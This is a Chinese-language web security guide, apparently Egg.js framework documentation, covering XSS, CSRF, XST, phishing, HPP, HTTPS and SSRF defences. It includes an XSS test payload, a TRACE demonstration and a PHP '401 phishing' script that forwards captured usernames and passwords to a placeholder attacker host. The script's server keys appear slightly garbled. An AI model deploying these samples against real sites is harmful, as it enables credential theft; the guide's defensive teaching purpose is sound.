# 安全



##WEB安全概念

Web 应用中存在很多安全风险，这些风险会被黑客利用，轻则篡改网页内容，重则窃取网站内部数据，更为严重的则是在网页中植入恶意代码，使得用户受到侵害。常见的安全漏洞如下：

- XSS 攻击：对 Web 页面注入脚本，使用 JavaScript 窃取用户信息，诱导用户操作。
- CSRF 攻击：伪造用户请求向网站发起恶意请求。
- 钓鱼攻击：利用网站的跳转链接或者图片制造钓鱼陷阱。
- HTTP参数污染：利用对参数格式验证的不完善，对服务器进行参数注入攻击。
- 远程代码执行：用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令。

而框架本身针对 Web 端常见的安全风险内置了丰富的解决方案：

- 利用 [extend](https://github.com/eggjs/egg/blob/master/docs/source/zh-cn/basics/extend.md) 机制扩展了 Helper API, 提供了各种模板过滤函数，防止钓鱼或 XSS 攻击。
- 常见 Web 安全头的支持。
- CSRF 的防御方案。
- 灵活的安全配置，可以匹配不同的请求 url 。
- 可定制的白名单，用于安全跳转和 url 过滤。
- 各种模板相关的工具函数做预处理。



## 防范XSS

XSS（cross-site scripting跨域脚本攻击）攻击是最常见的 Web 攻击，其重点是『跨域』和『客户端执行』。

XSS 攻击一般分为两类：

- Reflected XSS（反射型的 XSS 攻击）
- Stored XSS（存储型的 XSS 攻击）



#####Reflected XSS

反射型的 XSS 攻击，主要是由于服务端接收到客户端的不安全输入，在客户端触发执行从而发起 Web 攻击。比如：

在某购物网站搜索物品，搜索结果会显示搜索的关键词。搜索关键词填入`<script>alert('handsome boy')</script>`, 点击搜索。页面没有对关键词进行过滤，这段代码就会直接在页面上执行，弹出 alert。



##### Stored XSS

基于存储的 XSS 攻击，是通过提交带有恶意脚本的内容存储在服务器上，当其他人看到这些内容时发起 Web 攻击。一般提交的内容都是通过一些富文本编辑器编辑的，很容易插入危险代码。



##### JSONP XSS

JSONP 的 callback 参数非常危险，他有两种风险可能导致 XSS

1、callback 参数意外截断js代码，特殊字符单引号双引号，换行符均存在风险。

2、callback 参数恶意添加标签（如 `<script>` ），造成 XSS 漏洞。

参考 [JSONP 安全攻防](http://blog.knownsec.com/2015/03/jsonp_security_technic/)

框架内部使用 [jsonp-body](https://github.com/node-modules/jsonp-body) 来对 JSONP 请求进行安全防范。

防御内容：

- callback 函数名词最长 50 个字符限制
- callback 函数名只允许 `[`, `]`, `a-zA-Z0123456789_`, `$`, `.`，防止一般的 XSS，utf-7 XSS等攻击。

可定义配置：

- callback 默认 `_callback`，可以重命名。
- limit - 函数名 length 限制，默认 50。



#####其他 XSS 的防范方式

浏览器自身具有一定针对各种攻击的防范能力，他们一般是通过开启 Web 安全头生效的。框架内置了一些常见的 Web 安全头的支持。

#### CSP

W3C 的 Content Security Policy，简称 CSP，主要是用来定义页面可以加载哪些资源，减少 XSS 的发生。

框架内支持 CSP 的配置，不过是默认关闭的，开启后可以有效的防止 XSS 攻击的发生。要配置 CSP , 需要对 CSP 的 policy 策略有了解，具体细节可以参考 [CSP 是什么](https://www.zhihu.com/question/21979782)。

#### X-Download-Options:noopen

默认开启，禁用 IE 下下载框Open按钮，防止 IE 下下载文件默认被打开 XSS。

#### X-Content-Type-Options:nosniff

禁用 IE8 自动嗅探 mime 功能例如 `text/plain` 却当成 `text/html` 渲染，特别当本站点 serve 的内容未必可信的时候。

#### X-XSS-Protection

IE 提供的一些 XSS 检测与防范，默认开启

- close 默认值false，即设置为 `1; mode=block`

## 



## 防范CSRF

[CSRF](https://www.owasp.org/index.php/CSRF)（Cross-site request forgery跨站请求伪造，也被称为 `One Click Attack` 或者 `Session Riding`，通常缩写为 CSRF 或者 XSRF，是一种对网站的恶意利用。 CSRF 攻击会对网站发起恶意伪造的请求，严重影响网站的安全。因此框架内置了 CSRF 防范方案。

通常来说，对于 CSRF 攻击有一些通用的[防范方案](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet#CSRF_Specific_Defense)，简单的介绍几种常用的防范方案：

* Synchronizer Tokens：通过响应页面时将 token 渲染到页面上，在 form 表单提交的时候通过隐藏域提交上来。
* Double Cookie Defense：将 token 设置在 Cookie 中，在提交 post 请求的时候提交 Cookie，并通过 header 或者 body 带上 Cookie 中的 token，服务端进行对比校验。
* Custom Header：信任带有特定的 header（例如 `X-Requested-With: XMLHttpRequest`）的请求。这个方案可以被绕过，所以 rails 和 django 等框架都[放弃了该防范方式](https://www.djangoproject.com/weblog/2011/feb/08/security/)。





## 防范XST

[XST](https://www.owasp.org/index.php/XST) 的全称是 `Cross-Site Tracing`，客户端发 TRACE 请求至服务器，如果服务器按照标准实现了 TRACE 响应，则在 response body 里会返回此次请求的完整头信息。通过这种方式，客户端可以获取某些敏感的头字段，例如 httpOnly 的 Cookie。

下面我们基于 Koa 来实现一个简单的支持 TRACE 方法的服务器：

```
var koa = require('koa');
var app = koa();

app.use(function* (next) {
  this.cookies.set('a', 1, { httpOnly: true });
  if (this.method === 'TRACE') {
    var body = '';
    for (header in this.headers) {
      body += header + ': ' + this.headers[header] + '\r\n';
    }
    this.body = body;
  }
  yield* next;
});

app.listen(7001);
```

启动服务后，先发个 GET 请求 `curl -i http://127.0.0.1:7001`，得到如下响应：

```
HTTP/1.1 200 OK
X-Powered-By: koa
Set-Cookie: a=1; path=/; httponly
Content-Type: text/plain; charset=utf-8
Content-Length: 2
Date: Thu, 06 Nov 2014 05:04:42 GMT
Connection: keep-alive

OK
```

服务器设置了一个 httpOnly 的 Cookie 为 1，在浏览器环境中，是无法通过脚本获取它的。

接着我们发 TRACE 请求到服务器`curl -X TRACE -b a=1 -i http://127.0.0.1:7001`，并带上 Cookie，得到如下响应：

```
HTTP/1.1 200 OK
X-Powered-By: koa
Set-Cookie: a=1; path=/; httponly
Content-Type: text/plain; charset=utf-8
Content-Length: 73
Date: Thu, 06 Nov 2014 05:07:47 GMT
Connection: keep-alive

user-agent: curl/7.37.1
host: 127.0.0.1:7001
accept: */*
cookie: a=1
```

在响应体里可以看到完整的头信息，这样我们就绕过了 httpOnly 的限制，拿到了cookie=1，造成了很大的风险。



## 防范`钓鱼攻击`

钓鱼有多种方式，这里介绍 url 钓鱼、图片钓鱼和 iframe 钓鱼。

### url 钓鱼

服务端未对传入的跳转 url 变量进行检查和控制，可能导致可恶意构造任意一个恶意地址，诱导用户跳转到恶意网站。 由于是从可信的站点跳转出去的，用户会比较信任，所以跳转漏洞一般用于钓鱼攻击，通过转到恶意网站欺骗用户输入用户名和密码盗取用户信息，或欺骗用户进行金钱交易； 也可能引发的 XSS 漏洞（主要是跳转常常使用 302 跳转，即设置 HTTP 响应头，Locatioin: url，如果 url 包含了 CRLF，则可能隔断了 HTTP 响应头，使得后面部分落到了 HTTP body，从而导致 XSS 漏洞）。

### 防范方式

- 若跳转的 url 事先是可以确定的，包括 url 和参数的值，则可以在后台先配置好，url 参数只需传对应 url 的索引即可，通过索引找到对应具体 url 再进行跳转；
- 若跳转的 url 事先不确定，但其输入是由后台生成的（不是用户通过参数传人），则可以先生成好跳转链接然后进行签名；
- 若 1 和 2 都不满足，url 事先无法确定，只能通过前端参数传入，则必须在跳转的时候对 url 进行按规则校验：判断 url 是否在应用授权的白名单内。

框架提供了安全跳转的方法，可以通过配置白名单避免这种风险。

- `ctx.redirect(url)` 如果不在配置的白名单内，则禁止。
- `ctx.unsafeRedirect(url)` 一般不建议使用，明确了解可能带来的风险后使用。

安全方案覆盖了默认的`ctx.redirect`方法，所有的跳转均会经过安全域名的判断。

用户如果使用`ctx.redirect`方法，需要在应用的配置文件中做如下配置：

```
// config/config.default.js
exports.security = {
  domainWhiteList:['.domain.com'],  // 安全白名单，以 . 开头
};
```

若用户没有配置 `domainWhiteList` 或者 `domainWhiteList`数组内为空，则默认会对所有跳转请求放行，即等同于`ctx.unsafeRedirect(url)`

### 图片钓鱼

如果可以允许用户向网页里插入未经验证的外链图片，这有可能出现钓鱼风险。

比如常见的 `401钓鱼`, 攻击者在访问页面时，页面弹出验证页面让用户输入帐号及密码，当用户输入之后，帐号及密码就存储到了黑客的服务器中。 通常这种情况会出现在`<img src=$url />`中，系统不对`$url`是否在域名白名单内进行校验。

攻击者可以在自己的服务器中构造以下代码：

401.php：作用为弹出 401 窗口，并且记录用户信息。

```
<?php
    header('WWW-Authenticate: Basic realm="No authorization"');
    header('HTTP/1.1 401 Unauthorized');
        $domain = "http://hacker.com/fishing/";
        if ($_SERVER[sectech:'PHP_AUTH_USER'] !== null){
                header("Location: ".$domain."record.php?a=".$_SERVER[sectech:'PHP_AUTH_USER']."&b=".$_SERVER[sectech:'PHP_AUTH_PW']);
        }
?>
```

之后攻击者生成一个图片链接`<img src="http://xxx.xxx.xxx/fishing/401.php?a.jpg//" />`。

当用户访问时，会弹出信息让用户点击，用户输入的用户名及密码会被黑客的服务器偷偷记录。

### 防范方式

框架提供了 `.surl()` 宏做 url 过滤。

用于在 html 标签中中要解析 url 的地方（比如 `<a href=""/><img src=""/>`），其他地方不允许使用。

对模板中要输出的变量，加 `helper.surl($value)`。

**注意：在需要解析 url 的地方，surl 外面一定要加上双引号，否则就会导致XSS漏洞。**

不使用 surl

```
<a href="$value" />
```

output:

```
<a href="http://ww.safe.com<script>" />
```

使用 surl

```
<a href="helper.surl($value)" />
```

output:

```
<a href="http://ww.safe.com&lt;script&gt;" />
```

### iframe 钓鱼

[iframe 钓鱼](https://www.owasp.org/index.php/Cross_Frame_Scripting)，通过内嵌 iframe 到被攻击的网页中，攻击者可以引导用户去点击 iframe 指向的危险网站，甚至遮盖，影响网站的正常功能，劫持用户的点击操作。

框架提供了 `X-Frame-Options` 这个安全头来防止 iframe 钓鱼。默认值为 SAMEORIGIN，只允许同域把本页面当作 iframe 嵌入。

当需要嵌入一些可信的第三方网页时，可以关闭这个配置。



## 防范HPP

Http Parameter Pollution（HPP)，即 HTTP 参数污染攻击。在HTTP协议中是允许同样名称的参数出现多次，而由于应用的实现不规范，攻击者通过传播参数的时候传输 key 相同而 value 不同的参数，从而达到绕过某些防护的后果。

HPP 可能导致的安全威胁有：

- 绕过防护和参数校验。
- 产生逻辑漏洞和报错，影响应用代码执行。

### 拓展阅读

- https://www.owasp.org/index.php/Testing_for_HTTP_Parameter_pollution_(OTG-INPVAL-004)
- http://blog.csdn.net/eatmilkboy/article/details/6761407
- https://media.blackhat.com/bh-us-11/Balduzzi/BH_US_11_Balduzzi_HPP_WP.pdf
- ebay 因参数污染存在 RCE（远程命令执行）漏洞：http://secalert.net/2013/12/13/ebay-remote-code-execution/

### 如何防范

框架本身会在客户端传输 key 相同而 value 不同的参数时，强制使用第一个参数，因此不会导致 hpp 攻击。



## [中间人攻击](https://www.owasp.org/index.php/Man-in-the-middle_attack)与 HTTP / HTTPS

HTTP 是网络应用广泛使用的协议，负责 Web 内容的请求和获取。然而，内容请求和获取时会经过许多中间人，主要是网络环节，充当内容入口的浏览器、路由器厂商、WIFI提供商、通信运营商，如果使用了代理、翻墙软件则会引入更多中间人。由于 HTTP 请求的路径、参数默认情况下均是明文的，因此这些中间人可以对 HTTP 请求进行监控、劫持、阻挡。

在没有 HTTPS 时，运营商可在用户发起请求时直接跳转到某个广告，或者直接改变搜索结果插入自家的广告。如果劫持代码出现了 BUG ，则直接让用户无法使用，出现白屏。

数据泄露、请求劫持、内容篡改等等问题，核心原因就在于 HTTP 是全裸式的明文请求，域名、路径和参数都被中间人们看得一清二楚。HTTPS 做的就是给请求加密，让其对用户更加安全。对于自身而言除了保障用户利益外，还可避免本属于自己的流量被挟持，以保护自身利益。

尽管 HTTPS 并非绝对安全，掌握根证书的机构、掌握加密算法的组织同样可以进行中间人形式的攻击。不过HTTPS是现行架构下最安全的解决方案，并且它大幅增加了中间人攻击的成本。

因此，请各位使用 Egg 框架开发网站的开发者，务必推动自己的网站升级到 HTTPS。

对于 HTTPS 来讲，还有一点要注意的是 HTTP 严格传输安全（HSTS），如果不使用 HSTS，当用户在浏览器中输入网址时没有加 HTTPS，浏览器会默认使用 HTTP 访问

框架提供了 `hsts Strict-Transport-Security` 这个头的默认开启。让 HTTPS 站点不跳转到 HTTP，如果站点支持 HTTPS，请一定要开启。

如果我们的Web 站点是 http 站点，需要关闭这个头。配置如下：

- maxAge 默认一年 `365 * 24 * 3600`。
- includeSubdomains 默认 false, 可以添加子域名，保证所有子域名都使用 HTTPS 访问。





## 防范SSRF

通过 [Server-Side Request Forgery(SSRF)](https://www.owasp.org/index.php/Server_Side_Request_Forgery) 攻击，攻击者可以发起网络请求访问或者操作内部网络的资源。

一般来说，SSRF 安全漏洞常见于开发者在服务端直接请求客户端传递进来的 URL 资源，一旦攻击者传入一些内部的 URL 即可发起 SSRF 攻击。

### 如何防范

通常我们会基于内网 IP 黑名单的形式来防范 SSRF 攻击，通过对解析域名后得到的 IP 做过滤，禁止访问内部 IP 地址来达到防范 SSRF 攻击的目的。

框架在 `ctx`, `app` 和 `agent` 上都提供了 `safeCurl` 方法，在发起网络请求的同时会对指定的内网 IP 地址过滤，除此之外，该方法和框架提供的 `curl` 方法一致。

- `ctx.safeCurl(url, options)`
- `app.safeCurl(url, options)`
- `agent.safeCurl(url, options)`

#### 配置

直接调用 `safeCurl` 方法其实并没有任何作用，还需要配合安全配置项。

- `ipBlackList`(Array) - 配置内网 IP 名单，在这些网段内的 IP 地址无法被访问。
- `checkAddress`(Function) - 直接配置一个检查 IP 地址的函数，根据函数的返回值来判断是否允许在 `safeCurl` 中被访问，当返回非 `true` 时，该 IP 无法被访问。`checkAddress` 优先级高于 `ipBlackList`。

```
// config/config.default.js
exports.security = {
  ssrf: {
    ipBlackList: [
      '10.0.0.0/8', // 支持 IP 网段
      '0.0.0.0/32',
      '127.0.0.1',  // 支持指定 IP 地址
    ],
    // 配置了 checkAddress 时，ipBlackList 不会生效
    checkAddress(ip) {
      return ip !== '127.0.0.1';
    },
  },
};
```





#### [HttpBasicAuth](HttpBasicAuth.md)与[JWT](Jwt.md)安全认证

* 

